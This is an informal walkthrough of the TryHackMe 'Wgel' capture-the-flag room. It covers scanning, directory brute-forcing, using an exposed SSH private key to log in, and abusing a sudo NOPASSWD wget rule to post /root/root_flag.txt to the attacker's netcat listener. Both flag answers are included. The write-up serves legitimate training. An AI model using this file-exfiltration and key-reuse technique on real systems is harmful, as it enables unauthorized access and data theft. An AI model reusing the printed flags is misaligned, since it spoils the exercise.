                 WGEL CTF
                 
 -   1 - User flag
 - Let’s start by scanning the IP with nmap :-

     nmap -sV -Pn ip 

![Screenshot from 2023-05-07 10-39-57](https://user-images.githubusercontent.com/132823987/236684339-5677f854-5f3f-47b4-8fda-1499df51cc3d.png)
Then we have 2 open ports :- ssh and http.

Lets start with http:-
 -we haven't robot.txt file here.
 ![Screenshot from 2023-05-07 10-29-14](https://user-images.githubusercontent.com/132823987/236684419-e8328438-0c16-4660-9a4c-1543d73a9217.png)
 -the displayed default page is apache welcome page.
 ![Screenshot from 2023-05-07 10-28-11](https://user-images.githubusercontent.com/132823987/236684423-18aa76ce-a048-428b-8cda-355ba82ffe9b.png)
 After we scan the next step is directory bruteforce.
  for this step we use gobuster,Dirb.
  
 Lets go for Dirb => dirb <ip with http://>
 
  Result = we have many results, but the main is /sitemap/
![Screenshot from 2023-05-07 10-59-05](https://user-images.githubusercontent.com/132823987/236685322-eb6251ba-81de-4981-86fa-e8b2380f9c89.png)

 then we get good,cool website.
![Screenshot from 2023-05-07 10-31-52](https://user-images.githubusercontent.com/132823987/236683996-c15a3815-8170-4640-8c4b-c6600f300b82.png)
 again we brute foce it the :- http:// ip /sitemap.
![Screenshot from 2023-05-07 10-59-15](https://user-images.githubusercontent.com/132823987/236685582-130071c2-39ed-4aef-a0b4-825978f61bcd.png)

 Then we get /.shh/ file.
![Screenshot from 2023-05-07 10-38-05](https://user-images.githubusercontent.com/132823987/236684183-2302216b-cec7-4047-beaf-ab768bc1518a.png)
After this we see id_rsa file.
![Screenshot from 2023-05-07 10-38-12](https://user-images.githubusercontent.com/132823987/236684205-236e518d-ea71-4088-a896-42c4c68c7092.png)
then we open and save the private key as id_rsa.
![Screenshot from 2023-05-07 10-41-13](https://user-images.githubusercontent.com/132823987/236685599-b4d495f8-2223-4be2-9634-a96b141f0f84.png)
-Let's give permission for id_rsa : chmod 600 id_rsa
![Screenshot from 2023-05-07 11-29-02](https://user-images.githubusercontent.com/132823987/236689980-b7fefbe8-7677-420f-9e0c-cfbfc48ea2f3.png)

SO we try ssh shell for this => ssh -i id_rsa jessie@ ip

![Screenshot from 2023-05-07 12-09-00](https://user-images.githubusercontent.com/132823987/236689812-e4901f20-c389-412d-b0cf-6a17de549a1d.png)
BUT who is jessie and how you get it?
answer : as we see we have http open port and in the web if you see page/source code you will get jessie.
![Screenshot from 2023-05-07 10-30-29](https://user-images.githubusercontent.com/132823987/236684118-e1a5827e-a377-4c93-9174-b342d8d6a27e.png)
Then we get Jessie's shell.
After this  :- - go to /Documents/ => cd /Documents/
            - ls then you get "user_flag.txt"
            - cat user_flag.txt 
            ![Screenshot from 2023-05-07 12-10-02](https://user-images.githubusercontent.com/132823987/236690030-2ac1ccbb-eee2-43b0-9292-499f8d94e06c.png)

- copy the flag and submit it on tryhackme.com/room/wgel/
 ![Screenshot from 2023-05-07 12-28-08](https://user-images.githubusercontent.com/132823987/236690086-fd7d30ab-e4a5-4f96-967d-d987b848508a.png)

       - ANSWER 1:

        057c67131c3d5e42dd5cd3075b198ff6
       

  -   2  - Root flag
    
 On JESSIE'S shell - ls -l /root/ 
 then the shell says 'Permission denied'
 ![Screenshot from 2023-05-07 12-10-32](https://user-images.githubusercontent.com/132823987/236689683-23ee6f70-3640-496b-bc3c-0314c7efa64c.png)
       do sudo -l =>  (root) NOPASSWD: /usr/bin/wget
       ![Screenshot from 2023-05-07 12-11-06](https://user-images.githubusercontent.com/132823987/236689700-1eaceac4-f0a0-43b2-bddc-dc12027a405c.png)
   then he tells you the wget command work without sudo privilage.

-After this we need file upload but before this we must run 'netcat'.
  run this command      => nc -lvp 1234
![Screenshot from 2023-05-07 11-34-27](https://user-images.githubusercontent.com/132823987/236687849-5cdb78bb-a7d0-487a-8fe6-ac76ca272bd7.png)

- for file upload run this command :-
     => sudo wget --post-file=/root/root_flag.txt (your pc ip and the port you use for nc )
      for e.x :- 10.10.10.10:1234
      ![Screenshot from 2023-05-07 11-39-30](https://user-images.githubusercontent.com/132823987/236687989-0a9f4c47-96e5-40cc-950c-ba3ba0a7a00b.png)
     THEN you will get the root flag through the netcat listener.
![Screenshot from 2023-05-07 11-50-07](https://user-images.githubusercontent.com/132823987/236688214-72af6c5d-306b-45e3-8df8-7b5cc6b33348.png)

-copy the flag and submit it on tryhackme.com/room/wgel/ 
![Screenshot from 2023-05-07 12-38-15](https://user-images.githubusercontent.com/132823987/236690659-b48c4182-f5ef-44b0-84e2-931abdebe185.png)

 -ANSWER :-
 
     -  b1b968b37519ad1daa6408188649263d
                                                  
